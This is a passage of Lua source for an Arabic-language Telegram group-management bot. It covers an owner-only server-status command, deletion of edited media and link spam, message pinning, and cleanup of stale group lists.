if text == 'معلومات السيرفر' or text == 'السيرفر' or text == '↫ السيرفر ᥀' then 
if not JokerSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, io.popen([[
LinuxVersion=`lsb_release -ds`
MemoryUsage=`free -m | awk 'NR==2{printf "%s/%sMB {%.2f%%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
Percentage=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
UpTime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}'`
echo '᥀︙نظام التشغيل ↫ ⤈\n`'"$LinuxVersion"'`' 
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الذاكره العشوائيه ↫ ⤈\n`'"$MemoryUsage"'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙وحدة التخزين ↫ ⤈\n`'"$HardDisk"'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙المعالج ↫ ⤈\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$Percentage%} "'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الدخول ↫ ⤈\n`'`whoami`'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙مدة تشغيل السيرفر ↫ ⤈\n`'"$UpTime"'`'
]]):read('*a'), 1, 'md')
end
end
--     Source BlAcK     --
BlAcKFiles(msg)
--     Source BlAcK     --
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
DevJoker:incr(BlAcK..'Joker:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevJoker:get(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_) and not Text and not JokerConstructor(result) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
Media = 'الميديا'
if result.content_.ID == "MessagePhoto" then Media = 'الصوره'
elseif result.content_.ID == "MessageVideo" then Media = 'الفيديو'
elseif result.content_.ID == "MessageAnimation" then Media = 'المتحركه'
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local Jokername = '᥀︙العضو ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')'
local Jokerid = '᥀︙ايديه ↫ `'..dp.id_..'`'
local Jokertext = '᥀︙قام بالتعديل على '..Media
local Jokertxt = '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙تعالو يامشرفين اكو مخرب'
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,Joker) 
local admins = Joker.members_  
text = '\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for i=0 , #admins do 
if not Joker.members_[i].bot_info_ then
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
if data.first_name_ ~= false then
text = text.."~ [@"..data.username_.."]\n"
end
if #admins == i then 
SendText(msg.chat_id_, Jokername..'\n'..Jokerid..'\n'..Jokertext..text..Jokertxt,0,'md') 
end
end,nil)
end
end
end,nil)
end,nil)
end
if not VipMem(result) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if DevJoker:get(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end,nil)
--     Source BlAcK     --
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local GetMsgPin = DevJoker:get(BlAcK..'Joker:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevJoker:del(BlAcK..'Joker:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevJoker:del(BlAcK..'Joker:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevJoker:del(BlAcK..'Joker:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevJoker:del(BlAcK..'Joker:PinnedMsgs'..msg.chat_id_) end,nil)   
end end end
--     Source BlAcK     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mجاري تنظيف المجموعات الوهميه يرجى الانتظار\n\27[1;37m')
local PvList = DevJoker:smembers(BlAcK..'Joker:Users')  
for k,v in pairs(PvList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local GpList = DevJoker:smembers(BlAcK..'Joker:Groups') 
for k,v in pairs(GpList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=BlAcK,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevJoker:srem(BlAcK..'Joker:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevJoker:srem(BlAcK..'Joker:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevJoker:srem(BlAcK..'Joker:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
DevJoker:srem(BlAcK..'Joker:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
DevJoker:sadd(BlAcK..'Joker:Groups',v)  
end end,nil) end
end
--     Source BlAcK     --
end 
------------------------------------------------
-- This Source Was Developed By (JOKER) @UUOUOU_7.--
--   This Is The Source Channel @BLACK_TEAM_4 .   --
--                - BlAcK -                 --
--        -- https://t.me/BLACK_TEAM_4 --         --
------------------------------------------------   
